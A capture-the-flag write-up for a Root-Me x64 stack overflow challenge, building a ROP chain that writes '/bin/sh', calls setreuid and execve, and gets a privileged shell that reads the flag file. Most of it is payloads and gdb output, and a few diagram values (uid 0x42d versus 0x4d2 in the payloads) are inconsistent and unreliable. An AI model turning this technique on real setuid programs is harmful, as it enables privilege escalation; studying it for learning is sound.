# ELF x64 - Stack buffer overflow - advanced
https://www.root-me.org/en/Challenges/App-System/ELF64-Stack-buffer-overflow-advanced
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 Yes 
NX 	Non-Executable Stack 	                 Yes 
ASLR 	Address Space Layout Randomization 	 Yes 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge03.root-me.org
Protocol	SSH
Port	        2223
SSH access 	ssh -p 2223 app-systeme-ch34@challenge03.root-me.org   
Username	app-systeme-ch34
Password	app-systeme-ch34
```
A little recon:
```sh
app-systeme-ch34@challenge03:~$ ls -l
total 864
-rwsr-x--- 1 app-systeme-ch34-cracked app-systeme-ch34 877214 mai   16  2015 ch34
-rw-r----- 1 app-systeme-ch34-cracked app-systeme-ch34    383 mai   24  2015 ch34.c
app-systeme-ch34@challenge03:~$ readelf -S ./ch34
There are 30 section headers, starting at offset 0xc1d38:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
[... snip ...] 
  [16] .tdata            PROGBITS         00000000006bfe40  000bfe40
       0000000000000020  0000000000000000 WAT       0     0     16
  [17] .tbss             NOBITS           00000000006bfe60  000bfe60
       0000000000000038  0000000000000000 WAT       0     0     16
  [18] .init_array       INIT_ARRAY       00000000006bfe60  000bfe60
       0000000000000010  0000000000000000  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       00000000006bfe70  000bfe70
       0000000000000010  0000000000000000  WA       0     0     8
  [20] .jcr              PROGBITS         00000000006bfe80  000bfe80
       0000000000000008  0000000000000000  WA       0     0     8
  [21] .data.rel.ro      PROGBITS         00000000006bfea0  000bfea0
       00000000000000e4  0000000000000000  WA       0     0     32
  [22] .got              PROGBITS         00000000006bff88  000bff88
       0000000000000070  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         00000000006c0000  000c0000
       0000000000001bd0  0000000000000000  WA       0     0     32
  [24] .bss              NOBITS           00000000006c1be0  000c1bd0
       0000000000002518  0000000000000000  WA       0     0     32
  [25] __libc_freeres_pt NOBITS           00000000006c40f8  000c1bd0
       0000000000000030  0000000000000000  WA       0     0     8
  [26] .comment          PROGBITS         0000000000000000  000c1bd0
[... snip ...]
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```
We've got an executable with sbit set - so technically we can elevate privileges. Let's try to exploit it and get a shell.
After a few tries, one could get the following output from gdb:
```gdb
(gdb) run < <(python -c "print 'A'*280 + 'DDDD'")
Starting program: /challenge/app-systeme/ch34/ch34 < <(python -c "print 'A'*280 + 'DDDD'")
Hex result: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141411c0100000c010000414141414141414144444444

Program received signal SIGSEGV, Segmentation fault.
0x0000000044444444 in ?? ()
```
So apparently the offset is 280 bytes.<br>
We've got control on the _rip_, but ASLR and NX are set. So, let's try to ROP our way to shell.<br>
In order to do so, we need to write "/bin/sh" to somewhere, there call setreuid (for changing the permissions) and then call execve syscall.<br>

So first, let's find a place to store the "/bin/sh\x00" string. According to the ```readelf``` output, the _.tdata_ section has enough size for our task (20 bytes while we need 8).<br>
Its address is **0x6bfe40** and it has the W flag on. In addition, its address won't get randomized because ASLR, so it's a pretty decent choice.<br>
Now we need some gadgets (1 for writing to memory and 2 for changing the registers values). Using ROPgadget, one can find the following gadgets:
```asm
0x00000000004016d3 : pop rdi ; ret
0x00000000004b81a7 : pop rcx ; ret
0x0000000000427a3d : mov dword ptr [rdi - 2], ecx ; ret
```
(Notice that the write gadget writes the _ecx_ only).
So after we've overflowed the buffer and have control on the _rip_ value, we can set the stack's next values to the following:
```
+---------------------------+
|    0x00000000004016d3     |         ;   for setting the rdi value (first gadget)
+---------------------------+
|    0x00000000006bfe42     |         ;   the first word address (notice the third gadget has -2)
+---------------------------+
|    0x00000000004b81a7     |         ;   for setting the rcx value (second gadget)
+---------------------------+
|  "/bin\x00\x00\x00\x00"   |         ;   the first word's value (because we write ecx to memory)
+---------------------------+
|    0x0000000000427a3d     |         ;   for writing the data (third gadget)
+---------------------------+
|    0x00000000004016d3     |         ;   for setting the rdi value (first gadget)
+---------------------------+
|    0x00000000006bfe46     |         ;   the second word address (notice the third gadget has -2)
+---------------------------+
|    0x00000000004b81a7     |         ;   for setting the rcx value (second gadget)
+---------------------------+
| "/sh\x00\x00\x00\x00\x00" |         ;   the second word's value (because we write ecx to memory)
+---------------------------+
|    0x0000000000427a3d     |         ;   for writing the data (third gadget)
+---------------------------+
```
Let's verify it in gdb:
```gdb
(gdb) run < <(python -c "print 'A'*280 + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x42\xfe\x6b\x00\x00\x00\x00\x00' + '\xa7\x81\x4b\x00\x00\x00\x00\x00' + '/bin\x00\x00\x00\x00' + '\x3d\x7a\x42\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x46\xfe\x6b\x00\x00\x00\x00\x00' + '\xa7\x81\x4b\x00\x00\x00\x00\x00' + '/sh\x00\x00\x00\x00\x00' + '\x3d\x7a\x42\x00\x00\x00\x00\x00'")
Starting program: /challenge/app-systeme/ch34/ch34 < <(python -c "print 'A'*280 + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x42\xfe\x6b\x00\x00\x00\x00\x00' + '\xa7\x81\x4b\x00\x00\x00\x00\x00' + '/bin\x00\x00\x00\x00' + '\x3d\x7a\x42\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x46\xfe\x6b\x00\x00\x00\x00\x00' + '\xa7\x81\x4b\x00\x00\x00\x00\x00' + '/sh\x00\x00\x00\x00\x00' + '\x3d\x7a\x42\x00\x00\x00\x00\x00'")
Hex result: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141411b0100000c0100004141414141414141ffffffd31640

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
(gdb) x/1s 0x6bfe40
0x6bfe40:	"/bin/sh"
```

Awesome! We've got a fixed address which contains "/bin/sh" :sunglasses: Step 1 is finished.<br>

Next, we'll need to call **setreuid** function (or **sys_setreuid** system call).<br>
For that, we'll need a syscall gadget, and 3 gadgets for controlling the _rax_, _rdi_ and _rsi_.<br>
We've already found a gadget for changing the _rdi_, and using ROPgadget (again) one can find the rest:
```asm
0x000000000044d2b4 : pop rax ; ret
0x00000000004016d3 : pop rdi ; ret
0x00000000004017e7 : pop rsi ; ret
0x0000000000400488 : syscall ; add rsp, 0x600 ; pop rbx ; pop rbp ; pop r12; ret
```
Again, let's construct a ROP chain:
```
+---------------------------+
|    0x000000000044d2b4     |         ;   for setting the rax value (first gadget)
+---------------------------+
|    0x0000000000000071     |         ;   the new value of rax (the value of sys_setreuid syscall)
+---------------------------+
|    0x00000000004016d3     |         ;   for setting the rdi value (second gadget)
+---------------------------+
|    0x000000000000042d     |         ;   the new value of rdi (the value of the app-systeme-ch34-cracked uid)
+---------------------------+
|    0x00000000004017e7     |         ;   for setting the rsi value (third gadget)
+---------------------------+
|    0x000000000000042d     |         ;   the new value of rsi (the value of the app-systeme-ch34-cracked uid)
+---------------------------+
|    0x0000000000400488     |         ;   for triggering the syscall
+---------------------------+
```
Let's verify it in gdb:
```gdb
(gdb) break *0x0000000000400488
Breakpoint 1 at 0x400488
(gdb) run < <(python -c "print 'A'*280 + '\xb4\xd2\x44\x00\x00\x00\x00\x00' + '\x71\x00\x00\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\xd2\x04\x00\x00\x00\x00\x00\x00' + '\xe7\x17\x40\x00\x00\x00\x00\x00' + '\xd2\x04\x00\x00\x00\x00\x00\x00' + '\x88\x04\x40\x00\x00\x00\x00\x00'")
Starting program: /challenge/app-systeme/ch34/ch34 < <(python -c "print 'A'*280 + '\xb4\xd2\x44\x00\x00\x00\x00\x00' + '\x71\x00\x00\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\xd2\x04\x00\x00\x00\x00\x00\x00' + '\xe7\x17\x40\x00\x00\x00\x00\x00' + '\xd2\x04\x00\x00\x00\x00\x00\x00' + '\x88\x04\x40\x00\x00\x00\x00\x00'")
Hex result: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141411b0100000c0100004141414141414141ffffffb4ffffffd244

Breakpoint 1, 0x0000000000400488 in backtrace_and_maps ()
(gdb) info registers
rax            0x71	113
rbx            0x4002b0	4194992
rcx            0x434310	4408080
rdx            0xa	10
rsi            0x4d2	1234
rdi            0x4d2	1234
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7ffd99d879d0	0x7ffd99d879d0
r8             0xa	10
r9             0x267c880	40355968
r10            0x22	34
r11            0x246	582
r12            0x0	0
r13            0x401760	4200288
r14            0x4017f0	4200432
r15            0x0	0
rip            0x400488	0x400488 <backtrace_and_maps+183>
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
```
Step 2 is complete :sunglasses: One last step remain.<br>
(Note: Because the third gadget mess up with the _rsp_, we'll have to correct it by filling up the buffer until the new _rsp_ value.)<br>

Now for the last part (calling execve with "/bin/sh") we'll use the following gadgets:
```asm
0x000000000044d2b4 : pop rax ; ret
0x00000000004016d3 : pop rdi ; ret
0x00000000004017e7 : pop rsi ; ret
0x0000000000437205 : pop rdx ; ret
0x0000000000400488 : syscall ; add rsp, 0x600 ; pop rbx ; pop rbp ; pop r12; ret
```
So, the chain will look like the following:
```
+---------------------------+
|    0x000000000044d2b4     |         ;   for setting the rax value (first gadget)
+---------------------------+
|    0x000000000000003b     |         ;   the new value of rax (the value of sys_execve syscall)
+---------------------------+
|    0x00000000004016d3     |         ;   for setting the rdi value (second gadget)
+---------------------------+
|    0x00000000006bfe40     |         ;   the new value of rdi (the address to "/bin/sh\x00" which was set before)
+---------------------------+
|    0x00000000004017e7     |         ;   for setting the rsi value (third gadget)
+---------------------------+
|    0x0000000000000000     |         ;   the new value of rsi (sets to NULL - no arguments needed)
+---------------------------+
|    0x0000000000437205     |         ;   for setting the rdx value (fourth gadget)
+---------------------------+
|    0x0000000000000000     |         ;   the new value of rsi (sets to NULL - no environment variables needed)
+---------------------------+
|    0x0000000000400488     |         ;   for triggering the syscall
+---------------------------+
```

Again (and for the last time), let's verify the chain:
```gdb
(gdb) run < <(python -c "print 'A'*280 + '\xb4\xd2\x44\x00\x00\x00\x00\x00' + '\x3b\x00\x00\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x40\xfe\x6b\x00\x00\x00\x00\x00' + '\xe7\x17\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x05\x72\x43\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x88\x04\x40\x00\x00\x00\x00\x00'")
Starting program: /challenge/app-systeme/ch34/ch34 < <(python -c "print 'A'*280 + '\xb4\xd2\x44\x00\x00\x00\x00\x00' + '\x3b\x00\x00\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x40\xfe\x6b\x00\x00\x00\x00\x00' + '\xe7\x17\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x05\x72\x43\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x88\x04\x40\x00\x00\x00\x00\x00'")
Hex result: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141411b0100000c0100004141414141414141ffffffb4ffffffd244

Breakpoint 1, 0x0000000000400488 in backtrace_and_maps ()
(gdb) info registers
rax            0x3b	59
rbx            0x4002b0	4194992
rcx            0x434310	4408080
rdx            0x0	0
rsi            0x0	0
rdi            0x6bfe40	7077440
rbp            0x4141414141414141	0x4141414141414141
rsp            0x7ffe36af3bb0	0x7ffe36af3bb0
r8             0xa	10
r9             0x2297880	36272256
r10            0x22	34
r11            0x246	582
r12            0x0	0
r13            0x401760	4200288
r14            0x4017f0	4200432
r15            0x0	0
rip            0x400488	0x400488 <backtrace_and_maps+183>
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
```
As you may see, _rax_ is set to the sys_execve syscall, _rdi_ is set to our address of "/bin/sh\x00", and _rsi_ and _rdx_ are set to NULL (0). Awesome! Now lets combine all of the chains into one big chain. We should remember the the syscall's gadget is messing up the _sp_ value, so we'll need to fill those bytes with junks:
```
+---------------------------+
|    280 bytes of junk      |         ;   triggering the overflow for controlling the rip
+---------------------------+
|    0x00000000004016d3     |         ;   for setting the rdi value (first gadget)
+---------------------------+
|    0x00000000006bfe42     |         ;   the first word address (notice the third gadget has -2)
+---------------------------+
|    0x00000000004b81a7     |         ;   for setting the rcx value (second gadget)
+---------------------------+
|  "/bin\x00\x00\x00\x00"   |         ;   the first word's value (because we write ecx to memory)
+---------------------------+
|    0x0000000000427a3d     |         ;   for writing the data (third gadget)
+---------------------------+
|    0x00000000004016d3     |         ;   for setting the rdi value (first gadget)
+---------------------------+
|    0x00000000006bfe46     |         ;   the second word address (notice the third gadget has -2)
+---------------------------+
|    0x00000000004b81a7     |         ;   for setting the rcx value (second gadget)
+---------------------------+
| "/sh\x00\x00\x00\x00\x00" |         ;   the second word's value (because we write ecx to memory)
+---------------------------+
|    0x0000000000427a3d     |         ;   for writing the data (third gadget)
+---------------------------+
|    0x000000000044d2b4     |         ;   for setting the rax value (first gadget)
+---------------------------+
|    0x0000000000000071     |         ;   the new value of rax (the value of sys_setreuid syscall)
+---------------------------+
|    0x00000000004016d3     |         ;   for setting the rdi value (second gadget)
+---------------------------+
|    0x000000000000042d     |         ;   the new value of rdi (the value of the app-systeme-ch34-cracked uid)
+---------------------------+
|    0x00000000004017e7     |         ;   for setting the rsi value (third gadget)
+---------------------------+
|    0x000000000000042d     |         ;   the new value of rsi (the value of the app-systeme-ch34-cracked uid)
+---------------------------+
|    0x0000000000400488     |         ;   for triggering the syscall
+---------------------------+
|    1560 bytes of junk     |         ;   the syscall's gadget adds 1560 (0x600 + 3 pops)
+---------------------------+
|    0x000000000044d2b4     |         ;   for setting the rax value (first gadget)
+---------------------------+
|    0x000000000000003b     |         ;   the new value of rax (the value of sys_execve syscall)
+---------------------------+
|    0x00000000004016d3     |         ;   for setting the rdi value (second gadget)
+---------------------------+
|    0x00000000006bfe40     |         ;   the new value of rdi (the address to "/bin/sh\x00" which was set before)
+---------------------------+
|    0x00000000004017e7     |         ;   for setting the rsi value (third gadget)
+---------------------------+
|    0x0000000000000000     |         ;   the new value of rsi (sets to NULL - no arguments needed)
+---------------------------+
|    0x0000000000437205     |         ;   for setting the rdx value (fourth gadget)
+---------------------------+
|    0x0000000000000000     |         ;   the new value of rsi (sets to NULL - no environment variables needed)
+---------------------------+
|    0x0000000000400488     |         ;   for triggering the syscall
+---------------------------+
```
Let's try it out:
```sh
app-systeme-ch34@challenge03:~$ cat <(python -c "print 'A'*280 + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x42\xfe\x6b\x00\x00\x00\x00\x00' + '\xa7\x81\x4b\x00\x00\x00\x00\x00' + '/bin\x00\x00\x00\x00' + '\x3d\x7a\x42\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x46\xfe\x6b\x00\x00\x00\x00\x00' + '\xa7\x81\x4b\x00\x00\x00\x00\x00' + '/sh\x00\x00\x00\x00\x00' + '\x3d\x7a\x42\x00\x00\x00\x00\x00' + '\xb4\xd2\x44\x00\x00\x00\x00\x00' + '\x71\x00\x00\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\xd2\x04\x00\x00\x00\x00\x00\x00' + '\xe7\x17\x40\x00\x00\x00\x00\x00' + '\xd2\x04\x00\x00\x00\x00\x00\x00' + '\x88\x04\x40\x00\x00\x00\x00\x00' + 'B'*1560 + '\xb4\xd2\x44\x00\x00\x00\x00\x00' + '\x3b\x00\x00\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x40\xfe\x6b\x00\x00\x00\x00\x00' + '\xe7\x17\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x05\x72\x43\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x88\x04\x40\x00\x00\x00\x00\x00'") - | ./ch34 
Hex result: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141411b0100000c0100004141414141414141ffffffd31640
id
uid=1234(app-systeme-ch34-cracked) gid=1134(app-systeme-ch34) groups=1134(app-systeme-ch34),100(users)
cat .passwd
<censored>
```


